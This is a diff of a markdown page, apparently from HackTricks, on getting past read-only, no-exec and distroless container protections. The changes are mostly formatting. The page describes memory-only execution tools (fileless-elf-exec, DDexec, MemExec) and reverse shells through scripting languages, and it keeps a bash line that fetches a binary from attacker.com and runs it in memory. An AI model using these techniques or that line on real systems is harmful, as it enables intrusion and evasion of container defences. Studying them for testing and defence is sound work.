@@ -1,14 +1,13 @@
 # Bypass FS protections: read-only / no-exec / Distroless
 
-{{#include ../../../banners/hacktricks-training.md}}
-
+\{{#include ../../../banners/hacktricks-training.md\}}
 
 ## Videos
 
 In the following videos you can find the techniques mentioned in this page explained more in depth:
 
-- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
+* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
 ## read-only / no-exec scenario
 
@@ -29,7 +28,7 @@ spec:
 
 However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
 
-> [!WARNING]
+> \[!WARNING]\
 > From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
 
 ## Easiest bypass: Scripts
@@ -48,7 +47,7 @@ If you have some powerful script engines inside the machine, such as **Python**,
 
 For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
 
-> [!WARNING]
+> \[!WARNING]\
 > This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
 >
 > Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
@@ -59,8 +58,7 @@ For this you can easily use the project [**fileless-elf-exec**](https://github.c
 
 Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
 
-> [!TIP]
-> **DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
+> \[!TIP]**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
 
 ```bash
 # Basic example
@@ -69,9 +67,9 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 For more information about this technique check the Github or:
 
-{{#ref}}
-ddexec.md
-{{#endref}}
+\{{#ref\}}\
+ddexec.md\
+\{{#endref\}}
 
 ### MemExec
 
@@ -95,23 +93,19 @@ The goal of distroless containers is to **reduce the attack surface of container
 
 In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
 
-> [!WARNING]
+> \[!WARNING]\
 > Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
 
 However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
 
-> [!TIP]
+> \[!TIP]\
 > Using the scripting language you could **enumerate the system** using the language capabilities.
 
 If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
 
-> [!TIP]
+> \[!TIP]\
 > However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
 
 You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-
-{{#include ../../../banners/hacktricks-training.md}}
-
-
-
+\{{#include ../../../banners/hacktricks-training.md\}}
